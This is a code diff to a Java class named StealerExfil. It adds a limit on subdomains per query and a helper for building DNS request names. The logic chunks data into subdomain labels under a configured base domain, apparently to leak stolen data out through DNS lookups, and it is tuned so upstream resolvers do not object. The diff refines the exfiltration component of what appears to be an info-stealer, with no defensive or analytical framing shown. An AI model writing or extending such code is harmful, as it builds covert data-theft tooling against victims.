@@ -23,6 +23,12 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
     static volatile String CONF_DOMAIN;
 
     /**
+     * Maximum number of subdomains.
+     * A value of 0 (default) means no limit.
+     */
+    static volatile int CONF_MAX_SUBDOMAINS = 0;
+
+    /**
      * Maximum number of characters for each subdomain.
      * DNS specifies a maximum number of 63 characters.
      * A custom value may be set if there are concerns that upstream DNS servers may dislike a large number of
@@ -225,24 +231,38 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
         }
 
         // Split subdomains into requests
-        StringBuilder request = new StringBuilder();
         int sequenceNumber = 0;
-        request.append(uniqueId).append("-").append(sequenceNumber++).append(baseDomain);
+        int countSubdomains = 0;
+        StringBuilder request = beginRequestBuild(uniqueId, sequenceNumber++, baseDomain);
         Iterator<String> reverse = splits.descendingIterator();
         while (reverse.hasNext()) {
+            if (CONF_MAX_SUBDOMAINS != 0 && countSubdomains >= CONF_MAX_SUBDOMAINS) {
+                // Maximum amount of subdomains per query reached, move on to create a new query
+                requests.add(request.toString());
+                request = beginRequestBuild(uniqueId, sequenceNumber++, baseDomain);
+                countSubdomains = 0;
+            }
+
             String split = reverse.next();
             if (split.length() + ".".length() + request.length() > CONF_FQDN_MAX_LEN) {
-                // This DNS request is full. Finalize it and begin on a new one.
+                // This DNS request is "full". Finalize it and begin on a new one.
                 requests.add(request.toString());
-                request = new StringBuilder();
-                request.append(uniqueId).append("-").append(sequenceNumber++).append(baseDomain);   // Code dup
+                request = beginRequestBuild(uniqueId, sequenceNumber++, baseDomain);
+                countSubdomains = 0;
             }
 
             request.insert(0, split + ".");
+            countSubdomains++;
         }
         requests.add(request.toString());
 
         return requests;
+    }
+
+    private static StringBuilder beginRequestBuild(String uniqueId, int sequenceNumber, String baseDomain) {
+        StringBuilder request = new StringBuilder();
+        request.append(uniqueId).append("-").append(sequenceNumber).append(baseDomain);
+        return request;
     }
 
     // Use the default system resolver for now
